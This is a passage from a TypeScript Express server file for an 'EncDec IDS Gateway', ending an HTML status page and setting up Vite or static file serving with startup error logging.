        <div class="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs">
          <span class="text-[10px] text-gray-500">
            Database Status: <strong class="text-emerald-400">Authenticated in Real-Time</strong>
          </span>

          <a href="/" class="px-4 py-2 rounded-xl bg-gray-800 hover:bg-gray-700 text-cyan-400 font-bold transition-all border border-gray-700 hover:border-cyan-400">
            Enter EncDec Console →
          </a>
        </div>

      </div>
    </body>
    </html>
  `;

  res.send(html);
});

// --- VITE & STATIC FILE SERVING ---
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true, hmr: false },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.on('error', (err: any) => {
    if (err.code === 'EADDRINUSE') {
      console.error(`[EncDec IDS Gateway] Port ${PORT} is already in use.`);
    } else {
      console.error('[EncDec IDS Gateway] Server error:', err);
    }
  });

  httpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`[EncDec IDS Gateway] Running on http://localhost:${PORT}`);
  });
}

startServer().catch(err => {
  console.error('[EncDec IDS Gateway] Failed to start server:', err);
});
